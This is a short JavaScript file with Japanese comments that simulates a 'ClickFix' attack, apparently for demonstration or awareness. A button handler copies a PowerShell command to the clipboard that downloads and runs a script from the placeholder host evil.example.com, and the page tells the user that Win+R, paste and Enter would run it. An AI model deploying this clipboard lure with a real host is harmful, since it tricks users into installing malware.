// clickfix.js - ClickFix攻撃シミュレーション

window.addEventListener("DOMContentLoaded", () => {
  const logArea = document.getElementById("clickfixLog");

  // 攻撃ペイロード（例：PowerShell経由でマルウェアをダウンロードして実行）
  const payload = `powershell -c "iwr http://evil.example.com/malware.ps1 -useb | iex"`;

  // ボタンにイベントハンドラを設定
  window.simulateClickFix = function () {
    navigator.clipboard.writeText(payload).then(() => {
      logArea.innerHTML = `
        ✅ 「修復する」ボタンがクリックされました。<br><br>
        🧨 以下のコマンドがクリップボードにコピーされました：<br>
        <code>${payload}</code><br><br>
        ⚠️ ユーザーが [Win] + [R] → [Ctrl + V] → [Enter] を行うと実行される可能性があります。
      `;
    }).catch(err => {
      logArea.innerHTML = `
        ❌ コピーに失敗しました。ブラウザーの制限またはユーザー操作が必要です。
      `;
      console.error("Clipboard write failed:", err);
    });
  };
});
